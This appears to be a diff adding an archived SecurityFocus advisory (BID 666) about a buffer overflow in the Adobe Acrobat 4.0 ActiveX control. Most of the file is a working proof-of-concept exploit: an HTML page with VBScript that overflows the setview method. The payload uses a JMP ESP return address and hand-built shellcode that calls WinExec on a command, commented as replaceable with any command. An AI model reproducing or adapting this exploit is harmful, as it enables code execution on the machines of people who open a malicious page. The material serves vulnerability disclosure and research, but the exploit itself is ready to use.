@@ -1,0 +1,79 @@
+source: http://www.securityfocus.com/bid/666/info
+
+There is a buffer overflow in the 1.3.188 version of the Adobe Acrobat ActiveX control (pdf.ocx) that ships with Acrobat Viewer 4.0. This ActiveX control is marked 'Safe for Scripting' within Internet Explorer 4.X. Arbitrary commands may be executed if the ActiveX control is run in a malicious manner 
+
+This control from Adobe Acrobat, can be exploited through 
+the setview method, and because ESP points to the address 
+after the RET address, we can place arbitrary code at this 
+point and JMP to it by RET'ing to a JMP ESP, in this case, 
+one found in Shell32. The code simply executes CALC.EXE 
+then calls ExitProcess to terminate the host without it 
+crashing. I have attempted to notify Adobe of the issue, 
+however they don't appear to have any form of direct 
+secure@ address.
+
+<object classid="clsid:CA8A9780-280D-11CF-A24D-444553540000"
+id="pdf"></object>
+
+<script language="VBscript"><!--
+
+msgbox("Adobe Acrobat OCX Buffer Overrun" + Chr(10) 
++ "Written by Shane Hird")
+
+expstr 
+= "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAA" 
+
+expstr = expstr + Chr(235)	'Address in SHELL32, Win98 
+(7FD035EB) of JMP ESP
+expstr = expstr + Chr(53)	'You may need to use a 
+different address
+expstr = expstr + Chr(208)
+expstr = expstr + Chr(127)
+
+'Stack is slightly trashed, but NOPs fix it up ok
+expstr = expstr + Chr(144) + Chr(144) + Chr(144) + Chr(144) 
++ Chr(144)
+
+'MOV EDI, ESP
+expstr = expstr + Chr(139) + Chr(252)
+
+'ADD EDI, 19 (Size of code)
+expstr = expstr + Chr(131) + Chr(199) + Chr(25)
+
+'PUSH EAX (Window Style EAX = 1)
+expstr = expstr + Chr(80)
+
+'PUSH EDI (Address of command line)
+expstr = expstr + Chr(87)
+
+'MOV EDX, BFFA0960 (WinExec, Win98)
+expstr = expstr + Chr(186) + Chr(96) + Chr(9) + Chr(250) + 
+Chr(191)
+
+'CALL EDX
+expstr = expstr + Chr(255) + Chr(210)
+
+'XOR EAX, EAX
+expstr = expstr + Chr(51) + Chr(192)
+
+'PUSH EAX
+expstr = expstr + Chr(80)
+
+'MOV EDX, BFF8D4CA (ExitProcess, Win98)
+expstr = expstr + Chr(186) + Chr(202) + Chr(212) + Chr(248) 
++ Chr(191)
+
+'CALL EDX
+expstr = expstr + Chr(255) + Chr(210)
+
+'Replace with any command + 0 (automatically appended)
+expstr = expstr + "CALC.EXE"
+
+'Call exploitable method
+pdf.setview(expstr)
+
+--></script>
